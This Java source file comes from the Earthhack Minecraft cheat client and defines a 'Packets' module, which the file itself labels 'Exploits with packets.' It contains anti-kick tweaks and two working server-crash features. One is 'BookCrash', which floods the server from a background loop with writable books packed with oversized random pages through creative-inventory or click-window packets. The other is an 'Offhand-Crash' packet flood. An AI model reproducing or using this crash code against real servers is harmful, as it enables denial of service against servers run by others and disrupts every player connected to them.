package me.earth.earthhack.impl.modules.misc.packets;

import me.earth.earthhack.api.module.Module;
import me.earth.earthhack.api.module.util.Category;
import me.earth.earthhack.api.setting.Complexity;
import me.earth.earthhack.api.setting.Setting;
import me.earth.earthhack.api.setting.settings.BooleanSetting;
import me.earth.earthhack.api.setting.settings.EnumSetting;
import me.earth.earthhack.api.setting.settings.NumberSetting;
import me.earth.earthhack.impl.core.mixins.network.MixinNetHandlerPlayClient;
import me.earth.earthhack.impl.core.mixins.network.MixinNettyCompressionDecoder;
import me.earth.earthhack.impl.core.mixins.network.MixinNettyPacketDecoder;
import me.earth.earthhack.impl.core.mixins.network.server.MixinSPacketResourcePack;
import me.earth.earthhack.impl.gui.visibility.PageBuilder;
import me.earth.earthhack.impl.gui.visibility.Visibilities;
import me.earth.earthhack.impl.managers.Managers;
import me.earth.earthhack.impl.managers.thread.scheduler.Scheduler;
import me.earth.earthhack.impl.modules.misc.packets.util.BookCrashMode;
import me.earth.earthhack.impl.modules.misc.packets.util.PacketPages;
import me.earth.earthhack.impl.util.client.SimpleData;
import me.earth.earthhack.impl.util.text.TextColor;
import net.minecraft.block.state.IBlockState;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.util.math.BlockPos;

import java.util.Collections;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;

public class Packets extends Module
{
    protected static final Random RANDOM = new Random();
    protected static final String SALT;

    static
    {
        SALT = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    }

    protected final Setting<PacketPages> page =
            register(new EnumSetting<>("Page", PacketPages.Safe));

    protected final Setting<Boolean> fastTransactions =
            register(new BooleanSetting("Transactions", true));
    protected final Setting<Boolean> fastTeleports =
            register(new BooleanSetting("Teleports", true));
    protected final Setting<Boolean> asyncTeleports =
            register(new BooleanSetting("Async-Teleports", false));
    protected final Setting<Boolean> fastDestroyEntities =
            register(new BooleanSetting("Fast-Destroy", true));
    protected final Setting<Boolean> fastSetDead =
            register(new BooleanSetting("SoundRemove", true));
    protected final Setting<Boolean> fastDeath =
            register(new BooleanSetting("Fast-Death", true));
    protected final Setting<Boolean> fastHeadLook =
            register(new BooleanSetting("Fast-HeadLook", false));
    protected final Setting<Boolean> fastEntities =
            register(new BooleanSetting("Fast-Entity", true));
    protected final Setting<Boolean> fastEntityTeleport =
            register(new BooleanSetting("Fast-EntityTeleport", true));
    protected final Setting<Boolean> cancelEntityTeleport =
            register(new BooleanSetting("Cancel-EntityTeleport", true));
    protected final Setting<Boolean> fastVelocity =
            register(new BooleanSetting("Fast-Velocity", true));
    protected final Setting<Boolean> cancelVelocity =
            register(new BooleanSetting("Cancel-Velocity", true));
    protected final Setting<Boolean> safeHeaders =
            register(new BooleanSetting("Safe-Headers", true));
    protected final Setting<Boolean> noHandChange =
            register(new BooleanSetting("NoHandChange", false));
    protected final Setting<Boolean> fastCollect =
            register(new BooleanSetting("Fast-Collect", false));
    protected final Setting<Boolean> miniTeleports =
            register(new BooleanSetting("Mini-Teleports", true));

    protected final Setting<Boolean> noBookBan =
            register(new BooleanSetting("AntiBookBan", false));
    protected final Setting<Boolean> fastBlockStates =
            register(new BooleanSetting("Fast-BlockStates", false));
    protected final Setting<Boolean> fastSetSlot =
            register(new BooleanSetting("Fast-SetSlot", false));
    protected final Setting<Boolean> ccResources =
            register(new BooleanSetting("CC-Resources", false));
    protected final Setting<Boolean> noSizeKick =
            register(new BooleanSetting("No-SizeKick", false));
    protected final Setting<BookCrashMode> bookCrash =
            register(new EnumSetting<>("BookCrash", BookCrashMode.None));
    protected final Setting<Integer> bookDelay =
            register(new NumberSetting<>("Book-Delay", 5, 0, 500));
    public Setting<Integer> bookLength =
            register(new NumberSetting<>("Book-Length", 600, 100, 8192));
    protected final Setting<Integer> offhandCrashes =
            register(new NumberSetting<>("Offhand-Crash", 0, 0, 5000));
    // TODO: use everywhere???
    protected final Setting<Boolean> volatileFix =
            register(new BooleanSetting("Volatile-Fix", false))
                .setComplexity(Complexity.Expert);

    protected final Map<BlockPos, IBlockState> stateMap;
    protected final AtomicBoolean crashing = new AtomicBoolean();
    protected String pages;

    public Packets()
    {
        super("Packets", Category.Misc);

        stateMap = new ConcurrentHashMap<>();

        this.listeners.add(new ListenerCollect(this));
        this.listeners.add(new ListenerConfirmTransaction(this));
        this.listeners.add(new ListenerBlockState(this));
        this.listeners.add(new ListenerBlockMulti(this));
        this.listeners.add(new ListenerPosLook(this));
        this.listeners.add(new ListenerSound(this));
        this.listeners.add(new ListenerTick(this));
        this.listeners.add(new ListenerWorldClient(this));
        this.listeners.add(new ListenerDisconnect(this));
        this.listeners.add(new ListenerDeath(this));
        this.listeners.add(new ListenerVelocity(this));
        this.listeners.add(new ListenerEntityTeleport(this));
        this.listeners.add(new ListenerDestroyEntities(this));
        this.listeners.add(new ListenerPlayerListHeader(this));
        this.listeners.add(new ListenerHeldItemChange(this));
        this.listeners.add(new ListenerSetSlot(this));
        this.listeners.add(new ListenerHeadLook(this));
        this.listeners.addAll(new ListenerEntity(this).getListeners());

        new PageBuilder<>(this, page)
           .addPage(v -> v == PacketPages.Safe, fastTransactions, miniTeleports)
           .addPage(v -> v == PacketPages.Danger, noBookBan, volatileFix)
           .register(Visibilities.VISIBILITY_MANAGER);

        SimpleData data = new SimpleData(this, "Exploits with packets.");
        data.register(page, "-Safe all Settings that are safe to use." +
                "\n-Danger all settings that might kick.");
        data.register(bookCrash,
                "Crashes the server with \"Book-Packets\".");
        data.register(fastTransactions,
                "Speeds up ConfirmTransaction packets a tiny bit.");
        data.register(fastTeleports,
                "Speeds up ConfirmTeleport packets a tiny bit.");
        data.register(asyncTeleports,
                "Might cause issues with movement and other modules.");
        data.register(fastDestroyEntities, "Makes Entities die faster.");
        data.register(fastDeath, "Makes Entities die faster.");
        data.register(fastEntities, "Makes Entities update faster.");
        data.register(fastEntityTeleport, "Makes Entities update faster.");
        data.register(cancelEntityTeleport, "Should be on. For Debugging.");
        data.register(fastVelocity, "Applies Velocity faster.");
        data.register(cancelVelocity, "Same as Cancel-EntityTeleport.");
        data.register(noHandChange,
                "Prevents the server from changing your hand");
        data.register(ccResources, "Only for Crystalpvp.cc and their current"
                + " ResourcePack patch. not recommended on other servers.");
        data.register(safeHeaders,
                "Fixes a bug in Mojangs code that could crash you.");
        data.register(miniTeleports,
                "Allows you to see when Entities move minimally.");
        data.register(fastSetDead,
                "Speeds up SoundRemove a bit.");
        data.register(noBookBan, "Only turn on if you are bookbanned." +
                " Can cause issues otherwise.");
        data.register(bookDelay,
                "Delay between 2 \"Book-Packets\".");
        data.register(offhandCrashes, "Packets to send per tick. " +
                "A value of 0 means Offhand-Crash is off.");
        data.register(noSizeKick, "Won't kick you for badly sized packets." +
                " This can cause weird stuff to happen.");
        this.setData(data);

        fastBlockStates.addObserver(e ->
        {
            if (!e.getValue())
            {
                Scheduler.getInstance().schedule(() ->
                {
                    if (!fastBlockStates.getValue())
                    {
                        stateMap.clear();
                    }
                });
            }
        });
    }

    @Override
    protected void onLoad()
    {
        bookCrash.setValue(BookCrashMode.None);
        offhandCrashes.setValue(0);
        pages = genRandomString(bookLength.getValue());
    }

    @Override
    public String getDisplayInfo()
    {
        String result = null;

        if (bookCrash.getValue() != BookCrashMode.None)
        {
            result = TextColor.RED + "BookCrash";
            if (offhandCrashes.getValue() != 0)
            {
                result += ", Offhand";
            }
        }
        else if (offhandCrashes.getValue() != 0)
        {
            result = TextColor.RED + "Offhand";
        }

        return result;
    }

    /**
     * {@link MixinNettyPacketDecoder}
     */
    public boolean isNoKickActive()
    {
        return this.isEnabled() && noSizeKick.getValue();
    }

    /**
     * {@link MixinSPacketResourcePack}
     */
    public boolean areCCResourcesActive()
    {
        return this.isEnabled() && ccResources.getValue();
    }

    /**
     * {@link MixinNetHandlerPlayClient}
     */
    public boolean areMiniTeleportsActive()
    {
        return this.isEnabled() && miniTeleports.getValue();
    }

    /**
     * {@link MixinNettyCompressionDecoder}
     */
    public boolean isNoBookBanActive()
    {
        return this.isEnabled() && noBookBan.getValue();
    }

    public void startCrash()
    {
        crashing.set(true);
        Managers.THREAD.submit(() ->
        {
            try
            {
                ItemStack stack = createStack();
                while (this.isEnabled()
                        && this.bookCrash.getValue() != BookCrashMode.None
                        && mc.player != null)
                {
                    Packet<?> packet = null;
                    switch (this.bookCrash.getValue())
                    {
                        case None:
                            crashing.set(false);
                            return;
                        case Creative:
                            packet = new CPacketCreativeInventoryAction(
                                0, stack);
                            break;
                        case ClickWindow:
                        case Console:
                            packet = new CPacketClickWindow(
                                0, 0, 0, ClickType.PICKUP, stack, (short) 0);
                            break;
                        default:
                    }

                    if (packet != null)
                    {
                        mc.player.connection.sendPacket(packet);
                    }

                    //noinspection BusyWait
                    Thread.sleep(bookDelay.getValue());
                }
            }
            catch (InterruptedException e)
            {
                Thread.currentThread().interrupt();
            }
            finally
            {
                crashing.set(false);
            }
        });
    }

    protected ItemStack createStack()
    {
        ItemStack stack = new ItemStack(Items.WRITABLE_BOOK);
        NBTTagList list = new NBTTagList();
        NBTTagCompound tag = new NBTTagCompound();

        if (bookCrash.getValue() == BookCrashMode.Console)
        {
            if (pages.length() != 0x2000)
            {
                pages = genRandomString(0x2000);
                bookLength.setValue(0x2000);
                bookDelay.setValue(225);
            }
        }
        else if (pages.length() != bookLength.getValue())
        {
            pages = genRandomString(bookLength.getValue());
        }

        for (int i = 0; i < 50; i++)
        {
            list.appendTag(new NBTTagString(pages));
        }

        tag.setString("author", mc.getSession().getUsername());
        tag.setString("title", "\n CrashBook \n");
        tag.setTag("pages", list);
        stack.setTagInfo("pages", list);
        stack.setTagCompound(tag);

        return stack;
    }

    private String genRandomString(Integer length)
    {
        StringBuilder salt = new StringBuilder();
        while (salt.length() < length)
        {
            int index = (int) (RANDOM.nextFloat() * SALT.length());
            salt.append(SALT.charAt(index));
        }

        return salt.toString();
    }

    public Map<BlockPos, IBlockState> getStateMap()
    {
        if (fastBlockStates.getValue())
        {
            return stateMap;
        }

        return Collections.emptyMap();
    }

}
